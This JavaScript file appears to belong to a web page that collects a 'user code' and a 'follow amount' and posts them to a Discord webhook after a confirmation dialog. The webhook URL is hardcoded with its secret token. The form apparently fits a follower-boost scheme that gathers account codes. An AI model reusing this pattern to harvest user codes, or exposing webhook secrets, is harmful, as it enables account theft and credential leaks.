// main.js

// Función para mostrar alertas
function displayAlert(title, text, icon, confirmButtonText) {
    const alertOptions = {
        background: "#141414",
        color: "#ffffff",
        title: "<b>" + title + "</b>",
        text: text,
        icon: icon,
        confirmButtonText: confirmButtonText,
        allowOutsideClick: false
    };
    Swal.fire(alertOptions);
}

// Función para enviar datos al webhook de Discord
async function sendToDiscord(userCode, followAmount) {
    const webhookURL = 'https://discord.com/api/webhooks/1333627119774732319/Y8muL0FbYvPP4MjejMQipthH_DjbpeQdlunNkaUFAPAQ8Z85DAFnvRfCEB6MyPCZyfBC'; // Reemplaza con tu URL de webhook

    const payload = {
        content: `User  Code: ${userCode}\nFollow Amount: ${followAmount}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            displayAlert("Success", "Data sent to Discord successfully!", "success", "Okay");
        } else {
            displayAlert("Error", "Failed to send data to Discord.", "error", "Retry");
        }
    } catch (error) {
        console.error("Error sending to Discord:", error);
        displayAlert("Error", "An error occurred while sending data.", "error", "Retry");
    }
}

// Evento para el botón "Start Process"
document.getElementById("Send").addEventListener("click", function() {
    const userCode = document.getElementById("user_code").value;
    const followAmount = document.getElementById("amount").value;

    // Validación de los campos
    if (!userCode || !followAmount) {
        displayAlert("Validation Error", "Please fill in all fields.", "warning", "Okay");
        return;
    }

    // Confirmación antes de enviar
    const confirmationMessage = {
        icon: "info",
        title: "<b>Is this correct 👀</b>",
        html: "User  Code: " + userCode + " | Follow Amount: " + followAmount,
        showDenyButton: true,
        confirmButtonText: "Confirm",
        denyButtonText: "Cancel",
        background: "#141414",
        color: "#ffffff"
    };

    Swal.fire(confirmationMessage).then((result) => {
        if (result.isConfirmed) {
            sendToDiscord(userCode, followAmount);
        }
    });
});
